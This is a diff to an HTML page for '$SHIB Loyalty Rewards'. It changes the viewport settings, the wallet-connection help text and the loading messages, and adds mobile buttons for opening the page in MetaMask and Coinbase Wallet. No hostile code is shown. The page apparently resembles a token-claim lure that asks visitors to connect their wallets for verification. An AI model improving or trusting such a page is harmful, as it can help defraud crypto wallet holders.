@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
   <title>$SHIB Loyalty Rewards — Born from a Vision. Built by the People.</title>
@@ -392,7 +392,13 @@
               </div>
               <p>Connect your Ethereum wallet to begin verification.</p>
               <button class="btn btn-buy btn-full" id="connectBtn">Connect Wallet</button>
-              <p class="claim-note">Supports MetaMask, Rabby, Coinbase Wallet, and other EIP-1193 wallets.</p>
+              <p class="claim-note">Works in MetaMask, Coinbase Wallet, Rabby, and other Web3 wallets. On phone, open this page inside your wallet app.</p>
+              <div class="mobile-wallet-help hidden" id="mobileWalletHelp">
+                <p class="mobile-wallet-help-title">Connect on mobile</p>
+                <p class="mobile-wallet-help-text">Safari and Chrome cannot connect wallets directly. Open this site inside a wallet app, then tap Connect Wallet.</p>
+                <a class="btn btn-buy btn-full mobile-wallet-link" id="openMetaMaskBtn" href="#" rel="noopener noreferrer">Open in MetaMask</a>
+                <a class="btn btn-outline btn-full mobile-wallet-link" id="openCoinbaseBtn" href="#" rel="noopener noreferrer">Open in Coinbase Wallet</a>
+              </div>
             </div>
 
             <div class="claim-body hidden" id="claimConnected">
@@ -434,7 +440,7 @@
               <div class="loading-state hidden" id="loadingState">
                 <div class="spinner"></div>
                 <p id="loadingText">Checking your $SHIB balance…</p>
-                <span class="loading-sub">Balance check and continuous hold scan · may take 20–60 seconds</span>
+                <span class="loading-sub">Balance check and hold scan · keep this tab open on mobile</span>
               </div>
             </div>
           </div>
